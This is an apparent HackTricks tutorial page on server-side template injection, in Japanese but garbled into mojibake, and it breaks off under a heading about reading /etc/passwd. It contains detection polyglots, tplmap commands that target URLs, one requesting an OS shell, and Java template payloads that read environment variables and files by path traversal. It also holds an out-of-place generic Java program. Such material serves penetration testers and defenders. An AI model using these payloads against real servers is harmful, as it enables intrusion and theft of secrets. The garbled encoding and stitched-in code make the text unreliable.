# SSTIï¼ˆã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ï¼‰

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (3).png" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com)ã¯ã€**ã‚¹ãƒšã‚¤ãƒ³**ã§æœ€ã‚‚é–¢é€£æ€§ã®é«˜ã„ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¤ãƒ™ãƒ³ãƒˆã§ã‚ã‚Šã€**ãƒ¨ãƒ¼ãƒ­ãƒƒãƒ‘**ã§ã‚‚æœ€ã‚‚é‡è¦ãªã‚¤ãƒ™ãƒ³ãƒˆã®ä¸€ã¤ã§ã™ã€‚ã“ã®å¤§ä¼šã¯ã€æŠ€è¡“çš„ãªçŸ¥è­˜ã‚’ä¿ƒé€²ã™ã‚‹ã“ã¨ã‚’ç›®çš„ã¨ã—ã¦ãŠã‚Šã€ã‚ã‚‰ã‚†ã‚‹åˆ†é‡ã®æŠ€è¡“ã¨ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®å°‚é–€å®¶ã®ãŸã‚ã®æ´»æ°—ã‚ã‚‹äº¤æµã®å ´ã§ã™ã€‚

{% embed url="https://www.rootedcon.com/" %}

## ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¨ã¯ä½•ã§ã™ã‹ï¼Ÿ

ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€æ”»æ’ƒè€…ãŒãƒã‚¤ãƒ†ã‚£ãƒ–ãªãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆæ§‹æ–‡ã‚’ä½¿ç”¨ã—ã¦æ‚ªæ„ã®ã‚ã‚‹ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã«æ³¨å…¥ã—ã€ãã‚ŒãŒã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã§å®Ÿè¡Œã•ã‚Œã‚‹å ´åˆã«ç™ºç”Ÿã—ã¾ã™ã€‚

**ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³**ã¯ã€**å›ºå®šã®**ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã¨**ä¸å®‰å®šãª**ãƒ‡ãƒ¼ã‚¿ã‚’çµ„ã¿åˆã‚ã›ã¦**ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã‚’ç”Ÿæˆ**ã™ã‚‹ãŸã‚ã«è¨­è¨ˆã•ã‚Œã¦ã„ã¾ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›ãŒãƒ‡ãƒ¼ã‚¿ã¨ã—ã¦æ¸¡ã•ã‚Œã‚‹ã®ã§ã¯ãªãã€ç›´æ¥ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã«é€£çµã•ã‚Œã‚‹å ´åˆã€ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æ”»æ’ƒãŒç™ºç”Ÿã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯ä»»æ„ã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã‚’æ³¨å…¥ã—ã¦ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã‚’æ“ä½œã—ã€ã—ã°ã—ã°ã‚µãƒ¼ãƒãƒ¼ã®**å®Œå…¨ãªåˆ¶å¾¡ã‚’å–å¾—**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

è„†å¼±ãªã‚³ãƒ¼ãƒ‰ã®ä¾‹ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™ï¼š
```php
$output = $twig->render("Dear " . $_GET['name']);
```
å‰ã®ä¾‹ã§ã¯ã€**ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã®ä¸€éƒ¨**è‡ªä½“ãŒ`GET`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿`name`ã‚’ä½¿ç”¨ã—ã¦**å‹•çš„ã«ç”Ÿæˆ**ã•ã‚Œã¦ã„ã¾ã™ã€‚ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã®æ§‹æ–‡ã¯ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã§è©•ä¾¡ã•ã‚Œã‚‹ãŸã‚ã€æ”»æ’ƒè€…ã¯`name`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿å†…ã«ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’é…ç½®ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š
```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```
## ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æ”»æ’ƒã®æ§‹ç¯‰

![](../../.gitbook/assets/ssti-methodology-diagram.png)

### æ¤œå‡º

è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®æœ€åˆã®ã‚¹ãƒ†ãƒƒãƒ—ã¯ã€ãã‚Œã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ã§ã™ã€‚ã‚‚ã£ã¨ã‚‚ç°¡å˜ãªåˆæœŸã‚¢ãƒ—ãƒ­ãƒ¼ãƒã¯ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå¼ã§ã‚ˆãä½¿ç”¨ã•ã‚Œã‚‹ç‰¹æ®Šæ–‡å­—ã®ã‚·ãƒ¼ã‚±ãƒ³ã‚¹ã‚’æ³¨å…¥ã—ã¦ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’**fuzzing**ã™ã‚‹ã“ã¨ã§ã™ã€‚ãŸã¨ãˆã°ã€ãƒãƒªã‚°ãƒ­ãƒƒãƒˆã®`${{<%[%'"}}%\`ãªã©ã§ã™ã€‚\
ã‚µãƒ¼ãƒãƒ¼ãŒè„†å¼±ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ã¯ã€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã«**é€šå¸¸ã®ãƒ‡ãƒ¼ã‚¿**ã‚’å…¥åŠ›ã—ãŸå ´åˆã¨**ä¸ãˆã‚‰ã‚ŒãŸãƒšã‚¤ãƒ­ãƒ¼ãƒ‰**ã®ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã®**é•ã„ã‚’è¦‹ã¤ã‘ã‚‹**å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚\
ã‚‚ã—**ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿ**ã—ãŸå ´åˆã€ã‚µãƒ¼ãƒãƒ¼ãŒè„†å¼±ã§ã‚ã‚‹ã“ã¨ã‚„ã€ã©ã®**ã‚¨ãƒ³ã‚¸ãƒ³ãŒå®Ÿè¡Œ**ã•ã‚Œã¦ã„ã‚‹ã‹ã‚’ç°¡å˜ã«ç‰¹å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã¾ãŸã€ä¸ãˆã‚‰ã‚ŒãŸãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒ**åæ˜ ã•ã‚Œã¦ã„ãªã„**å ´åˆã‚„ã€ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«**ä¸€éƒ¨ã®æ–‡å­—ãŒæ¬ ã‘ã¦ã„ã‚‹**å ´åˆã§ã‚‚ã€è„†å¼±ãªã‚µãƒ¼ãƒãƒ¼ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**æ¤œå‡º - å¹³æ–‡ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆ**

ä¸ãˆã‚‰ã‚ŒãŸå…¥åŠ›ã¯ã€ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«**ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ãŠã‚ˆã³åæ˜ **ã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯ç°¡å˜ã«å˜ç´”ãª[**XSS**](../xss-cross-site-scripting/)è„†å¼±æ€§ã¨é–“é•ãˆã‚‰ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ãŒã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå¼å†…ã§**æ•°å­¦æ¼”ç®—**ã‚’è¨­å®šã—ã‚ˆã†ã¨ã™ã‚‹ã¨åŒºåˆ¥ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```
**æ¤œå‡º - ã‚³ãƒ¼ãƒ‰ã®æ–‡è„ˆ**

ã“ã‚Œã‚‰ã®å ´åˆã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›**ã¯**ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå¼**å†…ã«é…ç½®ã•ã‚Œã¦ã„ã¾ã™ã€‚
```python
engine.render("Hello {{"+greeting+"}}", data)
```
ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹URLã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š`http://vulnerable-website.com/?greeting=data.username`

ã‚‚ã—**`greeting`**ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’**åˆ¥ã®å€¤**ã«**å¤‰æ›´**ã™ã‚‹ã¨ã€**ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼åãŒå«ã¾ã‚Œãªããªã‚Šã¾ã™**ãŒã€`http://vulnerable-website.com/?greeting=data.username}}hello`ã®ã‚ˆã†ãªã‚¢ã‚¯ã‚»ã‚¹ã‚’ã™ã‚‹ã¨ã€**ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼åãŒå«ã¾ã‚Œã¾ã™**ï¼ˆã‚¯ãƒ­ãƒ¼ã‚¸ãƒ³ã‚°ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå¼ã®æ–‡å­—ãŒ**`}}`**ã§ã‚ã‚‹å ´åˆï¼‰ã€‚\
ã“ã‚Œã‚‰ã®ãƒ†ã‚¹ãƒˆä¸­ã«**ã‚¨ãƒ©ãƒ¼**ãŒç™ºç”Ÿã—ãŸå ´åˆã€ã‚µãƒ¼ãƒãƒ¼ãŒè„†å¼±ã§ã‚ã‚‹ã“ã¨ãŒã‚ˆã‚Šç°¡å˜ã«è¦‹ã¤ã‘ã‚‰ã‚Œã¾ã™ã€‚

### ç‰¹å®š

ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®å¯èƒ½æ€§ã‚’æ¤œå‡ºã—ãŸã‚‰ã€æ¬¡ã®ã‚¹ãƒ†ãƒƒãƒ—ã¯ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã‚’ç‰¹å®šã™ã‚‹ã“ã¨ã§ã™ã€‚\
ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆè¨€èªã¯éå¸¸ã«å¤šãã‚ã‚Šã¾ã™ãŒã€å¤šãã®è¨€èªã¯HTMLã®æ–‡å­—ã¨è¡çªã—ãªã„ã‚ˆã†ã«ç‰¹åˆ¥ã«é¸ã°ã‚ŒãŸéå¸¸ã«ä¼¼ãŸæ§‹æ–‡ã‚’ä½¿ç”¨ã—ã¦ã„ã¾ã™ã€‚

ã‚‚ã—é‹ãŒè‰¯ã‘ã‚Œã°ã€ã‚µãƒ¼ãƒãƒ¼ãŒ**ã‚¨ãƒ©ãƒ¼ã‚’è¡¨ç¤º**ã—ã¦ã„ã‚‹å ´åˆã€ã‚¨ãƒ©ãƒ¼ã®ä¸­ã‹ã‚‰ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹**ã‚¨ãƒ³ã‚¸ãƒ³**ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã‚¨ãƒ©ãƒ¼ã‚’å¼•ãèµ·ã“ã™å¯èƒ½æ€§ã®ã‚ã‚‹ã„ãã¤ã‹ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

| `${}`       | `{{}}`       | `<%= %>`        |
| ----------- | ------------ | --------------- |
| `${7/0}`    | `{{7/0}}`    | `<%= 7/0 %>`    |
| `${foobar}` | `{{foobar}}` | `<%= foobar %>` |
| `${7*7}`    | `{{7*7}}`    | \`\`            |

ãã‚Œä»¥å¤–ã®å ´åˆã¯ã€**ç•°ãªã‚‹è¨€èªå›ºæœ‰ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰**ã‚’æ‰‹å‹•ã§ãƒ†ã‚¹ãƒˆã—ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã«ã‚ˆã£ã¦ã©ã®ã‚ˆã†ã«è§£é‡ˆã•ã‚Œã‚‹ã‹ã‚’èª¿æŸ»ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ä¸€èˆ¬çš„ãªæ–¹æ³•ã¯ã€ç•°ãªã‚‹ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã®æ§‹æ–‡ã‚’ä½¿ç”¨ã—ã¦ä»»æ„ã®æ•°å­¦æ¼”ç®—ã‚’æ³¨å…¥ã™ã‚‹ã“ã¨ã§ã™ã€‚ãã‚Œã‹ã‚‰ã€ãã‚Œã‚‰ãŒæ­£å¸¸ã«è©•ä¾¡ã•ã‚Œã‚‹ã‹ã©ã†ã‹ã‚’è¦³å¯Ÿã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã‚’æ”¯æ´ã™ã‚‹ãŸã‚ã«ã€æ¬¡ã®ã‚ˆã†ãªæ„æ€æ±ºå®šãƒ„ãƒªãƒ¼ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

![](<../../.gitbook/assets/image (272).png>)

### æ‚ªç”¨

**èª­ã‚€**

ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã‚’ç‰¹å®šã—ãŸå¾Œã®æœ€åˆã®ã‚¹ãƒ†ãƒƒãƒ—ã¯ã€ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’èª­ã‚€ã“ã¨ã§ã™ã€‚èˆˆå‘³ã®ã‚ã‚‹ä¸»è¦ãªé ˜åŸŸã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

* åŸºæœ¬æ§‹æ–‡ã‚’ã‚«ãƒãƒ¼ã™ã‚‹ã€Œãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆä½œæˆè€…å‘ã‘ã€ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã€‚
* ã€Œã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã«é–¢ã™ã‚‹è€ƒæ…®äº‹é …ã€- ãƒ†ã‚¹ãƒˆã—ã¦ã„ã‚‹ã‚¢ãƒ—ãƒªã‚’é–‹ç™ºã—ãŸäººã¯ãŠãã‚‰ãã“ã‚Œã‚’èª­ã‚“ã§ã„ãªã„å¯èƒ½æ€§ãŒã‚ã‚Šã€æœ‰ç”¨ãªãƒ’ãƒ³ãƒˆãŒå«ã¾ã‚Œã¦ã„ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
* çµ„ã¿è¾¼ã¿ãƒ¡ã‚½ãƒƒãƒ‰ã€é–¢æ•°ã€ãƒ•ã‚£ãƒ«ã‚¿ã€å¤‰æ•°ã®ãƒªã‚¹ãƒˆã€‚
* æ‹¡å¼µ/ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ãƒªã‚¹ãƒˆ - ã„ãã¤ã‹ã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§æœ‰åŠ¹ã«ãªã£ã¦ã„ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

**æ¢ç´¢**

è„†å¼±æ€§ãŒè¦‹ã¤ã‹ã‚‰ãªã„å ´åˆã€æ¬¡ã®ã‚¹ãƒ†ãƒƒãƒ—ã¯**ç’°å¢ƒã‚’æ¢ç´¢**ã—ã¦ã€**ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ãªã‚‚ã®**ã‚’æ­£ç¢ºã«æŠŠæ¡ã™ã‚‹ã“ã¨ã§ã™ã€‚ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã«ã‚ˆã£ã¦æä¾›ã•ã‚Œã‚‹**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**ã¨ã€é–‹ç™ºè€…ã«ã‚ˆã£ã¦ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã«æ¸¡ã•ã‚Œã‚‹**ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å›ºæœ‰ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**ã®ä¸¡æ–¹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚å¤šãã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚·ã‚¹ãƒ†ãƒ ã¯ã€ã‚¹ã‚³ãƒ¼ãƒ—å†…ã®ã™ã¹ã¦ã‚’å«ã‚€ã€Œselfã€ã¾ãŸã¯åå‰ç©ºé–“ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’å…¬é–‹ã—ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®å±æ€§ã‚„ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ãƒªã‚¹ãƒˆã™ã‚‹ãŸã‚ã®æ…£ç”¨çš„ãªæ–¹æ³•ã‚’æä¾›ã—ã¾ã™ã€‚

çµ„ã¿è¾¼ã¿ã®selfã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒãªã„å ´åˆã¯ã€[SecLists](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt)ã¨Burp Intruderã®ãƒ¯ãƒ¼ãƒ‰ãƒªã‚¹ãƒˆã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦å¤‰æ•°åã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

é–‹ç™ºè€…ãŒæä¾›ã—ãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ã¯ã€ç‰¹ã«æ©Ÿå¯†æƒ…å ±ãŒå«ã¾ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å†…ã®ç•°ãªã‚‹ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã”ã¨ã«ç•°ãªã‚‹å ´åˆãŒã‚ã‚‹ãŸã‚ã€ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã¯ç†æƒ³çš„ã«ã¯å€‹ã€…ã®ç•°ãªã‚‹ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã«é©ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

**æ”»æ’ƒ**

ã“ã®æ™‚ç‚¹ã§ã€åˆ©ç”¨å¯èƒ½ãªæ”»æ’ƒå¯¾è±¡ã«ã¤ã„ã¦ã®**æ˜ç¢ºãªã‚¢ã‚¤ãƒ‡ã‚¢**ãŒã‚ã‚‹ã¯ãšã§ã‚ã‚Šã€å¾“æ¥ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£æŸ»æ‰‹æ³•ã‚’ç”¨ã„ã¦ã€å„é–¢æ•°ã‚’æ¤œè¨¼ã—ã¦è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€ã‚ˆã‚Šåºƒç¯„ãªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®æ–‡è„ˆã§ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ - ä¸€éƒ¨ã®é–¢æ•°ã¯ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å›ºæœ‰ã®æ©Ÿèƒ½ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä»¥ä¸‹ã®ä¾‹ã§ã¯ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦ä»»æ„ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆä½œæˆã€ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿æ›¸ãã€ãƒªãƒ¢ãƒ¼ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã®ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰ã€æƒ…å ±ã®æ¼æ´©ã€ç‰¹æ¨©ã®æ˜‡æ ¼ã®è„†å¼±æ€§ã‚’ãƒˆãƒªã‚¬ãƒ¼ã—ã¾ã™ã€‚

## ãƒ„ãƒ¼ãƒ«

### [Tplmap](https://github.com/epinna/tplmap)
```python
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```
## Exploits

### Generic

ã“ã®**ãƒ¯ãƒ¼ãƒ‰ãƒªã‚¹ãƒˆ**ã«ã¯ã€ä»¥ä¸‹ã®ã‚¨ãƒ³ã‚¸ãƒ³ã®ç’°å¢ƒã§å®šç¾©ã•ã‚ŒãŸ**å¤‰æ•°**ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ï¼š

* [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)

### Java

**Java - åŸºæœ¬çš„ãªã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³**
```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```
**Java - ã‚·ã‚¹ãƒ†ãƒ ã®ç’°å¢ƒå¤‰æ•°ã‚’å–å¾—ã™ã‚‹**

```java
import java.util.Map;

public class EnvironmentVariables {
    public static void main(String[] args) {
        Map<String, String> env = System.getenv();
        for (String key : env.keySet()) {
            System.out.println(key + " : " + env.get(key));
        }
    }
}
```

ã“ã®Javaãƒ—ãƒ­ã‚°ãƒ©ãƒ ã¯ã€ã‚·ã‚¹ãƒ†ãƒ ã®ç’°å¢ƒå¤‰æ•°ã‚’å–å¾—ã™ã‚‹æ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚`System.getenv()`ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€ç’°å¢ƒå¤‰æ•°ã®ãƒãƒƒãƒ—ã‚’å–å¾—ã—ã€`for`ãƒ«ãƒ¼ãƒ—ã‚’ä½¿ç”¨ã—ã¦ã‚­ãƒ¼ã¨å€¤ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚
```java
${T(java.lang.System).getenv()}
```
# Java - /etc/passwdã®å–å¾—

## æ¦‚è¦

